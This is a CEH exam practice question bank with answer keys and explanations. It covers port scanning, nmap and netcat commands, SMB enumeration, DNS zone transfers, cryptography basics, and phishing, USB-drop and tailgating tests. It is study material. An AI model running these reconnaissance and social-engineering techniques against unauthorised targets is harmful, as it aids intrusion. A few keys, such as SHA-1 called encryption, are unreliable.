**Source:** Pass4Success

---

## Q45
**Using nslookup to list all DNS info for a domain. What is being attempted?**

- A) Zone harvesting
- B) Zone transfer
- C) Zone update
- D) Zone estimate

**Answer:** B
**Explanation:** A zone transfer replicates the entire DNS zone file.
**Source:** Pass4Success

---

## Q97
**Which protocol uses port 161 for queries and port 162 for traps?**

- A) SMTP
- B) SNMP
- C) LDAP
- D) NTP

**Answer:** B
**Explanation:** SNMP uses UDP 161 for queries and UDP 162 for trap notifications.
**Source:** CEH Study Guide

---

## Q99
**Which Nmap scan requires root/admin privileges?**

- A) TCP Connect (-sT)
- B) SYN scan (-sS)
- C) Version scan (-sV)
- D) List scan (-sL)

**Answer:** B
**Explanation:** SYN scans need raw socket access requiring root/admin privileges.
**Source:** CEH Study Guide

---

## Q119
**What does TCP SYN+ACK indicate?**

- A) Connection request
- B) Connection accepted / port open
- C) Connection terminated
- D) Data transfer in progress

**Answer:** B
**Explanation:** SYN+ACK is the second step of TCP handshake, indicating the port is open.
**Source:** CEH Study Guide

---

## Q132
**You see the following text written down - port:502. What does that likely reference?**

- A) Shodan search
- B) I/O search
- C) p0f results
- D) RIR query

**Answer:** A
**Explanation:** The 'port:' syntax is a Shodan search filter. Shodan is a search engine for Internet-connected devices, and 'port:502' would search for devices with Modbus (industrial control) port 502 open.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q137
**What is the primary purpose of a port scanner?**

- A) To identify vulnerabilities in software
- B) To encrypt network traffic
- C) To identify open ports on a network
- D) To monitor network traffic

**Answer:** C
**Explanation:** A port scanner is a tool used to identify open ports on a network that could potentially be exploited by attackers. It probes a server or host for open ports.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q160
**Which scanning technique involves sending SYN packets to a target and analyzing the responses to determine open ports?**

- A) Xmas Scan
- B) ACK Scan
- C) SYN Scan
- D) FIN Scan

**Answer:** C
**Explanation:** SYN Scan (half-open scan) uses SYN packets to identify open ports. An open port responds with SYN-ACK, a closed port with RST. Xmas Scan uses FIN, PSH, and URG flags; ACK Scan maps firewall rules.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-scanning-networks-1749512463846

---

## Q161
**During a network scan, an ethical hacker discovers a service running on port 22. Which of the following tools would best help the hacker identify the software version and potential vulnerabilities?**

- A) Wireshark
- B) Nmap
- C) Burp Suite
- D) Metasploit

**Answer:** B
**Explanation:** Nmap can perform service version detection (-sV) to identify software versions running on open ports. Wireshark analyzes packets, Burp Suite tests web applications, and Metasploit focuses on exploitation.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-scanning-networks-1749512463846

---

## Q162
**You have been tasked with performing a network scan to identify live hosts in a client's internal network. Which tool would you use to perform a simple ping sweep?**

- A) Nmap
- B) Wireshark
- C) John the Ripper
- D) Metasploit

**Answer:** A
**Explanation:** Nmap can perform ping sweeps for host discovery using the -sn flag. Wireshark is for packet analysis, John the Ripper for password cracking, and Metasploit for exploitation.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-scanning-networks-1749512463846

---

## Q210
**While performing enumeration tasks, you receive the results from an SMB scan. Which of the following could SMB enumeration reveal about the target system?**

- A) Open TCP and UDP ports
- B) User accounts and shared resources
- C) SSL certificate details
- D) Firewall rules and configurations

**Answer:** B
**Explanation:** SMB enumeration can reveal user accounts, shared resources (files and printers), and potentially sensitive information stored or shared on the Windows network.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-enumeration-1749512474899

---

## Q211
**As part of an enumeration phase, you're tasked with identifying shared folders on a target Windows network. Which command provides this information using SMB?**

- A) smbclient -L //targetIP
- B) nmap -sP targetIP
- C) netstat -rn
- D) tracert targetIP

**Answer:** A
**Explanation:** The 'smbclient -L //targetIP' command lists shared folders on a specified target using the SMB protocol, which is commonly used in Windows networks for file and printer sharing.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-enumeration-1749512474899

---

## Q212
**You are conducting a penetration test and need to identify email addresses associated with a domain. Which technique would be most useful for this enumeration task?**

- A) DNS zone transfer
- B) WHOIS lookup
- C) Harvesting from public sources
- D) Port scanning

**Answer:** C
**Explanation:** Harvesting from public sources such as social media, company websites, and public forums is the most effective method for collecting email addresses associated with a target domain.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-enumeration-1749512474899

---

## Q213
**You're attempting to enumerate a target system's DNS records to gather more information about the domain. Which tool would be most appropriate for this task?**

- A) nslookup
- B) Wireshark
- C) Hydra
- D) Metasploit

**Answer:** A
**Explanation:** Nslookup is a network administration command-line tool for querying the Domain Name System (DNS) to obtain domain name or IP address mapping or any other specific DNS record.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-enumeration-1749512474899

---

## Q214
**In a corporate environment, you need to enumerate the wireless networks within range. Which tool would be most appropriate for this task?**

- A) Aircrack-ng
- B) Wireshark
- C) Kismet
- D) Nmap

**Answer:** C
**Explanation:** Kismet is designed specifically for wireless network detection and enumeration, passively capturing SSIDs, signal strengths, encryption types, and other network details.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-enumeration-1749512474899

---

## Q215
**Which of the following tools is commonly used to perform DNS footprinting in the reconnaissance phase?**

- A) Nmap
- B) Metasploit
- C) Nslookup
- D) John the Ripper

**Answer:** C
**Explanation:** Nslookup is a command-line tool used to query Domain Name System (DNS) servers, making it valuable during the reconnaissance phase for gathering DNS information about a target.
**Source:** https://cehtest.com/ceh-questions.html

---

## Q216
**What type of scan sends a SYN packet and waits for a SYN-ACK or RST response to determine the status of the port?**

- A) SYN scan
- B) TCP connect scan
- C) ACK scan
- D) Xmas scan

**Answer:** A
**Explanation:** A SYN scan (half-open scan) sends SYN packets to determine whether ports are open (SYN-ACK response), closed (RST response), or filtered (no response).
**Source:** https://cehtest.com/ceh-questions.html

---

## Q220
**Which Nmap switch is best used to identify the operating system of servers on a DMZ?**

- A) nmap -P0
- B) nmap -sO
- C) nmap -sS
- D) nmap -O

**Answer:** D
**Explanation:** The -O flag in Nmap enables OS detection, which uses TCP/IP stack fingerprinting to identify the operating system running on target hosts.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q221
**Identifying the operating system of a target by analyzing traffic from a monitored switch describes which of the following activities?**

- A) Vulnerability scanning
- B) Nmap port scanning
- C) Active OS fingerprinting
- D) Passive OS fingerprinting

**Answer:** D
**Explanation:** Passive OS fingerprinting involves analyzing network traffic without sending any probes to the target. Monitoring switch traffic and analyzing packet characteristics is a passive technique.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q224
**Running 'nmap -sX -vv -P0 192.168.1.123 -p 80' on an open port returns what?**

- A) RST
- B) No response
- C) SYN ACK
- D) ACK

**Answer:** B
**Explanation:** An Xmas scan (-sX) sets FIN, PSH, and URG flags. Against an open port, there is no response (per RFC 793). Closed ports respond with RST.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q225
**Which Netcat command is used to perform a UDP scan of ports 1-1024?**

- A) Nc -sS -O target 1-1024
- B) Nc -hU <host(s)>
- C) Nc -sU -p 1-1024 <host(s)>
- D) Nc -u -v -w2 <host> 1-1024

**Answer:** D
**Explanation:** The -u flag specifies UDP mode, -v enables verbose output, and -w2 sets a 2-second timeout. The other options use Nmap-style syntax which is not valid for Netcat.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q226
**What does the command 'nmap -sL www.example.com' accomplish?**

- A) The system was offline
- B) This technique checks DNS only; no actual scanning occurs
- C) The syntax is incorrect
- D) ICMP is blocked

**Answer:** B
**Explanation:** The -sL flag performs a list scan, which only does a DNS resolution on the target and does not send any actual scanning packets to the host.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q227
**Given two hosts 192.168.1.24 and 192.168.1.35 with a subnet mask of 255.255.255.224, which statement is true?**

- A) They are on the same network
- B) Both have the default gateway 192.168.1.63
- C) Both have the default gateway 192.168.1.254
- D) They are on separate subnets

**Answer:** D
**Explanation:** With a /27 mask (255.255.255.224), subnets are in blocks of 32. 192.168.1.24 is in the 192.168.1.0/27 subnet, while 192.168.1.35 is in the 192.168.1.32/27 subnet - separate subnets.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q228
**Which type of scan is harder to perform due to the lack of responses from open services?**

- A) Stealth scanning
- B) ACK scanning
- C) UDP scanning
- D) FIN scan

**Answer:** C
**Explanation:** UDP scanning is challenging because open UDP ports typically do not send a response, making it difficult to distinguish between open and filtered ports. Only closed ports respond with ICMP unreachable.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q229
**What is the purpose of the command 'Nmap -sn 192.168.123.1-254'?**

- A) Ping only targets, no port scan
- B) NULL TCP scan
- C) TCP port scan
- D) Port scan all targets

**Answer:** A
**Explanation:** The -sn flag in Nmap performs a ping scan (host discovery) without port scanning. It determines which hosts are online without identifying open ports.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q230
**After identifying port 80 as open, what should be the next step?**

- A) Examine the webpage source code
- B) Use FTP to connect to port 80
- C) Telnet to the open port and grab the banner
- D) Attempt to connect to port 443

**Answer:** C
**Explanation:** Banner grabbing via Telnet is the standard next step after identifying an open port. It reveals the service name, version, and potentially the operating system, which informs further testing.
**Source:** https://www.pearsonitcertification.com/articles/article.aspx?p=3129461&seqNum=10

---

## Q254
**Finding information in a target's garbage is called what?**

- A) Social engineering
- B) Shoulder surfing
- C) Dumpster diving
- D) Tailgating

**Answer:** C
**Explanation:** Dumpster diving is the practice of searching through an organization's garbage to find discarded documents, hardware, or other materials that contain useful information for an attack.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q257
**If a Xmas scan on port 443 replies with RST, is the port open or closed?**

- A) Open
- B) Closed
- C) Filtered
- D) Cannot be determined

**Answer:** B
**Explanation:** In a Xmas scan, a closed port responds with an RST packet. An open port produces no response (as per RFC 793). A filtered port produces no response or an ICMP unreachable.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q258
**What is the major disadvantage of automated scanning tools like Nessus or Nmap?**

- A) They are expensive
- B) They are slow
- C) They are noisy and can trip IDS systems
- D) They produce too many false negatives

**Answer:** C
**Explanation:** Automated scanning tools like Nessus and Nmap are noisy - they generate significant network traffic that can easily be detected by IDS/IPS systems, alerting defenders to the scanning activity.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q268
**The process of investigation of a target to gather information is called what?**

- A) Discussion with people
- B) Enumeration of services
- C) Invention of services
- D) Footprinting

**Answer:** D
**Explanation:** Footprinting (also called reconnaissance) is the first step in ethical hacking, involving the investigation and information gathering about a target organization or system.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q269
**What does Google hacking primarily accomplish?**

- A) Fine-tunes search results using advanced operators
- B) Speeds up Google searches
- C) Targets specific domains only
- D) Finds Google-related information only

**Answer:** A
**Explanation:** Google hacking (Google dorking) uses advanced search operators like 'intitle:', 'filetype:', 'inurl:', and 'site:' to fine-tune search results and find sensitive information exposed on the web.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q344
**During a network scan, an ethical hacker discovers a service running on port 22. Which of the following tools would best help the hacker identify the software version and potential vulnerabilities of this service?**

- A) Wireshark
- B) Nmap
- C) Burp Suite
- D) Metasploit

**Answer:** B
**Explanation:** Nmap can perform service version detection (-sV flag) to identify software versions on open ports. Wireshark analyzes packets but lacks dedicated version detection. Burp Suite focuses on web application testing. Metasploit is primarily an exploitation framework.
**Source:** FlashGenius - CEH Scanning Networks Domain

---

## Q345
**You have been tasked with performing a network scan to identify live hosts in a client's internal network. Which tool would you use to perform a simple ping sweep to achieve this task?**

- A) Nmap
- B) Wireshark
- C) John the Ripper
- D) Metasploit

**Answer:** A
**Explanation:** Nmap provides versatile scanning capabilities including ping sweeps (nmap -sn) for host discovery. Wireshark captures and analyzes packets. John the Ripper is a password cracker. Metasploit is an exploitation framework.
**Source:** FlashGenius - CEH Scanning Networks Domain

---

## Q346
**What is the purpose of a port scanner?**

- A) Identify vulnerabilities in software
- B) Encrypt network traffic
- C) Identify open ports on a network
- D) Monitor network traffic

**Answer:** C
**Explanation:** Port scanners identify open ports and potentially exploitable services on networks. They do not encrypt traffic, monitor ongoing traffic, or directly identify software vulnerabilities.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q347
**Which tool is most commonly used for port scanning?**

- A) Wireshark
- B) Nmap
- C) Hydra
- D) Nikto

**Answer:** B
**Explanation:** Nmap is the industry-standard tool for identifying open ports and services on networks. Wireshark captures packets. Hydra performs password attacks. Nikto scans web servers.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q348
**What does a SYN scan do?**

- A) Completes the entire TCP handshake
- B) Sends a SYN packet to check open ports
- C) Performs a denial-of-service attack
- D) Tracks encrypted packets

**Answer:** B
**Explanation:** A SYN scan (half-open scan) sends SYN packets to detect open ports without completing the full TCP three-way handshake. It does not complete connections, perform DoS, or track encrypted traffic.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q349
**Enumeration is used to identify what?**

- A) Wireless routers
- B) Usernames, shares, and system details
- C) Power supply failures
- D) Malware signatures

**Answer:** B
**Explanation:** Enumeration extracts usernames, network shares, services, and system configuration details from a target system or network.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q350
**Which protocol is often used during enumeration?**

- A) SNMP
- B) FTP
- C) SSH
- D) SMTP

**Answer:** A
**Explanation:** SNMP (Simple Network Management Protocol) provides extensive network device and management information, making it a primary target during enumeration. Misconfigured SNMP community strings can leak significant network data.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q351
**Enumeration is useful to system hacking because it provides _______.**

- A) Passwords
- B) IP ranges
- C) Configuration
- D) Usernames

**Answer:** D
**Explanation:** Usernames are especially useful in the system-hacking process because they let you target accounts for password cracking. Enumeration can provide information regarding usernames and accounts that directly facilitate further attacks.
**Source:** Infibee - CEH Review Questions

---

## Q352
**What does the enumeration phase NOT discover?**

- A) Services
- B) User accounts
- C) Ports
- D) Shares

**Answer:** C
**Explanation:** Ports are usually uncovered during the scanning phase, not the enumeration phase. Enumeration focuses on extracting detailed information like services, user accounts, and network shares from identified hosts.
**Source:** Infibee - CEH Review Questions

---

## Q353
**Which of the following is a commonly used vulnerability assessment tool?**

- A) Metasploit
- B) Nikto
- C) Nessus
- D) Wireshark

**Answer:** C
**Explanation:** Nessus is a popular vulnerability scanner that identifies vulnerabilities, misconfigurations, and compliance issues. Metasploit is an exploitation framework. Nikto scans web servers. Wireshark is a packet analyzer.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q354
**Which of the following tools can be used to perform a DNS zone transfer?**

- A) NSLookup
- B) Finger
- C) Dig
- D) Netcat

**Answer:** A
**Explanation:** NSLookup (and also Dig, Sam Spade, Host) can be used to perform DNS zone transfers. Zone transfers copy DNS records from one server to another and can reveal the entire DNS zone file including all subdomains and IP mappings.
**Source:** Pass4Success - CEH 312-50

---

## Q355
**Tess King is using the nslookup command to craft queries to list all DNS information (Name Servers, host names, MX records, CNAME records, zone serial number, TTL records, etc.) for a domain. What is Tess King trying to accomplish?**

- A) A zone harvesting
- B) A zone transfer
- C) A zone update
- D) A zone estimate

**Answer:** B
**Explanation:** A zone transfer (AXFR) attempts to copy all DNS records from a DNS server. This can reveal the complete DNS zone file including all hostnames, subdomains, IP addresses, mail servers, and other DNS records for the target domain.
**Source:** Pass4Success - CEH 312-50

---

# Cryptography & Social Engineering (54 questions)

## Q71
**Which attack tries all possible keys?**

- A) Dictionary attack
- B) Birthday attack
- C) Brute force attack
- D) Side-channel attack

**Answer:** C
**Explanation:** Brute force systematically tries every possible key combination.
**Source:** CehTest.com

---

## Q72
**Which encryption algorithm is symmetric?**

- A) RSA
- B) AES
- C) Diffie-Hellman
- D) ECC

**Answer:** B
**Explanation:** AES uses the same key for encryption and decryption.
**Source:** CEH Study Guide

---

## Q73
**Primary purpose of a digital signature?**

- A) Encrypt the message
- B) Verify sender identity and message integrity
- C) Compress data
- D) Create VPN tunnel

**Answer:** B
**Explanation:** Digital signatures provide authentication and integrity verification.
**Source:** CEH Study Guide

---

## Q74
**Attacker intercepts and modifies communications between two parties. What attack?**

- A) Replay attack
- B) Man-in-the-middle
- C) Session hijacking
- D) DNS poisoning

**Answer:** B
**Explanation:** MITM intercepts and potentially alters communications between two parties.
**Source:** CEH Study Guide

---

## Q75
**Which hashing algorithm produces a 160-bit digest?**

- A) MD5
- B) SHA-1
- C) SHA-256
- D) SHA-512

**Answer:** B
**Explanation:** SHA-1 produces 160-bit digest. MD5 = 128-bit, SHA-256 = 256-bit.
**Source:** CEH Study Guide

---

## Q76
**Following an authorized person through a secure door. What technique?**

- A) Phishing
- B) Pretexting
- C) Tailgating
- D) Baiting

**Answer:** C
**Explanation:** Tailgating follows authorized persons through physical access controls.
**Source:** CEH Study Guide

---

## Q77
**Attacker sends emails pretending to be from victim's bank. What attack?**

- A) Spear phishing
- B) Phishing
- C) Whaling
- D) Vishing

**Answer:** B
**Explanation:** Phishing uses fraudulent emails impersonating trusted entities.
**Source:** CEH Study Guide

---

## Q117
**Difference between symmetric and asymmetric encryption?**

- A) Symmetric uses two keys
- B) Symmetric uses one shared key; asymmetric uses public/private pair
- C) Symmetric is slower
- D) No difference

**Answer:** B
**Explanation:** Symmetric = one key (fast, bulk data). Asymmetric = key pair (slower, key exchange/signatures).
**Source:** CEH Study Guide

---

## Q136
**Which of the following is a type of social engineering attack?**

- A) SQL injection
- B) Cross-site scripting
- C) Phishing
- D) Buffer overflow

**Answer:** C
**Explanation:** Phishing is a type of social engineering attack that involves tricking people into giving sensitive information such as login credentials or credit card numbers through deceptive emails or websites.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q141
**Which of the following is NOT a social engineering technique?**

- A) Pretexting
- B) Phishing
- C) Shoulder surfing
- D) SQL injection

**Answer:** D
**Explanation:** SQL injection is a technical attack that targets databases directly, not a social engineering technique. Social engineering refers to the use of psychological manipulation techniques to deceive people.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q143
**Which of the following is NOT a cryptography algorithm?**

- A) AES
- B) RSA
- C) SHA
- D) SQL

**Answer:** D
**Explanation:** SQL (Structured Query Language) is a programming language used to manage and manipulate databases, not a cryptography algorithm. AES, RSA, and SHA are all cryptographic algorithms.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q146
**Which of the following is NOT a social engineering method?**

- A) Pretexting
- B) Phishing
- C) Vishing
- D) Port Scanning

**Answer:** D
**Explanation:** Port scanning is a technical reconnaissance technique used to identify open network services, not a social engineering method. Pretexting, phishing, and vishing all involve human manipulation.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q148
**Which of the following is NOT an encryption algorithm?**

- A) AES
- B) RSA
- C) SHA-1
- D) Blowfish

**Answer:** C
**Explanation:** SHA-1 is a cryptographic hash function used to generate a fixed-size output from a variable-size input. It is not an encryption algorithm - it is a one-way function that cannot be reversed.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q149
**Which technique is used to hide a message or file within another message or file?**

- A) Steganography
- B) Cryptography
- C) Hashing
- D) Brute-force attack

**Answer:** A
**Explanation:** Steganography is the practice of concealing a message or file within another message or file, such as hiding data within an image or audio file, making its existence undetectable.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q155
**Which of the following is NOT a social engineering attack?**

- A) Phishing
- B) Shoulder surfing
- C) Denial of Service
- D) Tailgating

**Answer:** C
**Explanation:** Denial of Service (DoS) overwhelms systems with traffic and is a technical attack. Social engineering attacks like phishing, shoulder surfing, and tailgating manipulate individuals psychologically.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q182
**You are tasked with assessing a company's vulnerability to a USB drop attack. Which approach is most effective for this test?**

- A) Leave USB drives labeled 'Confidential' in the parking lot
- B) Distribute USB drives at the reception labeled 'Company Policy'
- C) Mail USB drives to employees labeled 'Free Software'
- D) Place USB drives in the cafeteria labeled 'Photos from Event'

**Answer:** A
**Explanation:** USB drives labeled 'Confidential' left in high-traffic areas like parking lots are most likely to pique curiosity, leading employees to plug them into their devices to see the content.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-social-engineering-1749512528860

---

## Q183
**You are tasked with assessing the resilience of an organization against spear phishing attacks. Which approach would most effectively simulate this type of attack?**

- A) Creating generalized phishing emails targeting multiple employees
- B) Crafting personalized emails using information specific to high-value targets
- C) Sending SMS messages with malicious links to all employees
- D) Distributing malware via USB drives left in common areas

**Answer:** B
**Explanation:** Spear phishing involves targeting specific individuals with personalized messages crafted using gathered intelligence about the target, making option B the most accurate simulation.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-social-engineering-1749512528860

---

## Q184
**Which of the following is the least effective method to prevent successful social engineering attacks within an organization?**

- A) Conducting regular security awareness trainings
- B) Implementing strict access control policies
- C) Using advanced firewall and IDS technologies
- D) Simulating phishing attacks and providing feedback

**Answer:** C
**Explanation:** While advanced firewalls and IDS are critical for network security, they do not directly prevent social engineering attacks, which target human vulnerabilities rather than technical ones.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-social-engineering-1749512528860

---

## Q185
**During a security assessment, you decide to use a social engineering toolkit to test the client's email security. Which of the following tools allows you to clone a website and use it for phishing attacks?**

- A) SET (Social Engineering Toolkit)
- B) Aircrack-ng
- C) Hydra
- D) John the Ripper

**Answer:** A
**Explanation:** The Social Engineering Toolkit (SET) is specifically designed for social engineering attacks and includes features to clone websites for credential harvesting phishing campaigns.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-social-engineering-1749512528860

---

## Q186
**A company is worried about unauthorized access to their building. As an ethical hacker, which social engineering technique could you suggest to test their physical security measures?**

- A) Phishing emails targeting employees to gain network access
- B) Tailgating into the building behind an authorized employee
- C) Installing keyloggers on publicly accessible computers
- D) Scanning the network for open ports

**Answer:** B
**Explanation:** Tailgating involves following an employee into a secure area without proper authentication and is an effective way to test physical security controls like access badges and mantrap systems.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-social-engineering-1749512528860

---

## Q219
**What type of cryptographic attack involves trying all possible keys to decrypt a message?**

- A) Dictionary attack
- B) Birthday attack
- C) Brute force attack
- D) Side-channel attack

**Answer:** C
**Explanation:** A brute force attack systematically tries all possible key combinations until the correct one is found. It is guaranteed to succeed but can be extremely time-consuming for strong encryption.
**Source:** https://cehtest.com/ceh-questions.html

---

## Q255
**A 160-bit encryption standard would be which of the following?**

- A) AES
- B) MD5
- C) SHA-1
- D) RC4

**Answer:** C
**Explanation:** SHA-1 (Secure Hash Algorithm 1) produces a 160-bit (20-byte) hash value. AES uses 128/192/256-bit keys, MD5 produces 128-bit hashes, and RC4 has variable key sizes.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q261
**Hiding information in whitespace is what steganography technique?**

- A) Snow
- B) OpenStego
- C) Invisible Secrets
- D) S-Tools

**Answer:** A
**Explanation:** Snow (Steganographic Nature Of Whitespace) is a steganography tool that conceals messages in ASCII text by appending whitespace to the ends of lines, making it invisible in normal text editors.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q266
**Symmetric cryptography is also known as what?**

- A) Hashing
- B) Shared key cryptography
- C) Public key cryptography
- D) Steganography

**Answer:** B
**Explanation:** Symmetric cryptography uses the same shared key for both encryption and decryption, hence the name 'shared key cryptography.' Public key cryptography is asymmetric.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q267
**A digital certificate is managed by what entity?**

- A) Key
- B) Certificate Authority
- C) Hub
- D) Public key

**Answer:** B
**Explanation:** A Certificate Authority (CA) is the trusted entity that issues, manages, and revokes digital certificates used in PKI (Public Key Infrastructure) for secure communications.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q271
**What is the most common biometric system used for building entry and laptops?**

- A) Retina system
- B) Fingerprint system
- C) Iris system
- D) Voice recognition system

**Answer:** B
**Explanation:** Fingerprint biometric systems are the most commonly deployed due to their cost-effectiveness, ease of use, and reliability compared to more expensive retina and iris scanners.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q369
**Symmetric encryption uses:**

- A) Two keys
- B) One key
- C) Four keys
- D) No keys

**Answer:** B
**Explanation:** Symmetric encryption employs a single shared key for both encryption and decryption. Both sender and receiver must possess the same secret key. Examples include AES, DES, and Blowfish.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q370
**Which algorithm is asymmetric?**

- A) AES
- B) DES
- C) RSA
- D) SHA-256

**Answer:** C
**Explanation:** RSA is an asymmetric algorithm that uses a public-private key pair. AES and DES are symmetric algorithms using a single shared key. SHA-256 is a hash function, not an encryption algorithm.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q371
**Hashing is used for:**

- A) Data encryption
- B) Data integrity
- C) Data storage
- D) File deletion

**Answer:** B
**Explanation:** Hashing creates a fixed-size checksum/digest to verify that data hasn't been altered. Unlike encryption, hashing is a one-way function. It ensures data integrity, not confidentiality.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q372
**What is the purpose of encryption?**

- A) To hide vulnerabilities
- B) To protect data from unauthorized access
- C) To detect sniffing
- D) To speed up applications

**Answer:** B
**Explanation:** Encryption transforms readable data (plaintext) into an unreadable format (ciphertext) to protect confidentiality and prevent unauthorized access to sensitive information.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q373
**Which method is used to hide a message or file inside another file in an undetectable way?**

- A) Steganography
- B) Cryptography
- C) Hashing
- D) Brute-force attack

**Answer:** A
**Explanation:** Steganography conceals messages or files within other innocent-looking files (images, audio, video) without altering the file's appearance. Cryptography encrypts data but doesn't hide its existence. Hashing verifies integrity.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q374
**Symmetric cryptography is also known as:**

- A) Hashing
- B) Shared key cryptography
- C) Public key cryptography
- D) Steganography

**Answer:** B
**Explanation:** Symmetric cryptography is also called shared key, secret key, or private key cryptography because both parties share the same key for encryption and decryption. Public key cryptography is asymmetric.
**Source:** Sulekha - CEH Exam Questions

---

## Q375
**Who manages digital certificates in a PKI infrastructure?**

- A) Key
- B) Certificate Authority
- C) Hub
- D) Public key

**Answer:** B
**Explanation:** The Certificate Authority (CA) is the trusted entity in PKI that issues, manages, signs, and revokes digital certificates. The CA validates the identity of certificate requesters and maintains certificate revocation lists.
**Source:** Sulekha - CEH Exam Questions

---

## Q376
**What is the primary difference between asymmetric and symmetric encryption?**

- A) Different keys vs. same keys used
- B) Speed differences only
- C) Channel security approaches
- D) All of the above

**Answer:** D
**Explanation:** Asymmetric and symmetric encryption differ in multiple ways: symmetric uses one shared key while asymmetric uses a key pair; symmetric is faster for bulk data; and they require different approaches to secure key distribution channels.
**Source:** Sulekha - CEH Exam Questions

---

## Q377
**Which mechanism best protects against theft of hard drives containing sensitive data?**

- A) Locks
- B) Backups
- C) Encryption
- D) Size

**Answer:** C
**Explanation:** Full-disk encryption (e.g., BitLocker, FileVault) ensures that even if a hard drive is physically stolen, the data remains unreadable without the encryption key. Locks deter physical theft but don't protect data. Backups preserve data but don't prevent theft.
**Source:** Sulekha - CEH Exam Questions

---

## Q378
**What is the standard port used for SSL/HTTPS web traffic?**

- A) 443
- B) 255
- C) 23
- D) 80

**Answer:** A
**Explanation:** Port 443 is the standard port for HTTPS (HTTP over SSL/TLS). Port 80 is used for unencrypted HTTP. Port 23 is used for Telnet. Port 255 is not a standard service port.
**Source:** Sulekha - CEH Exam Questions

---

## Q407
**What type of attack involves tricking people into giving sensitive information such as login credentials through deceptive emails or messages?**

- A) SQL injection
- B) Cross-site scripting
- C) Phishing
- D) Buffer overflow

**Answer:** C
**Explanation:** Phishing involves sending deceptive emails or messages that appear legitimate to trick recipients into revealing sensitive data or clicking malicious links. SQL injection and XSS are technical web attacks. Buffer overflow exploits memory.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q408
**Which of the following is NOT a common social engineering method?**

- A) Pretexting
- B) Phishing
- C) Vishing
- D) Port Scanning

**Answer:** D
**Explanation:** Port scanning is a technical network reconnaissance technique, not a social engineering method. Pretexting, phishing, and vishing (voice phishing) all exploit human trust and psychology.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q409
**What is phishing?**

- A) Scanning open ports
- B) Sending fake messages to steal data
- C) Encrypting system files
- D) Testing system performance

**Answer:** B
**Explanation:** Phishing uses deceptive communications (emails, websites, messages) designed to appear legitimate in order to trick recipients into revealing sensitive information such as passwords and financial data.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q410
**Which type of social engineering uses phone calls?**

- A) Smishing
- B) Phishing
- C) Vishing
- D) Baiting

**Answer:** C
**Explanation:** Vishing (voice phishing) exploits telephone communication to manipulate victims into revealing sensitive information. Smishing uses SMS. Phishing primarily uses email. Baiting offers physical/digital lures.
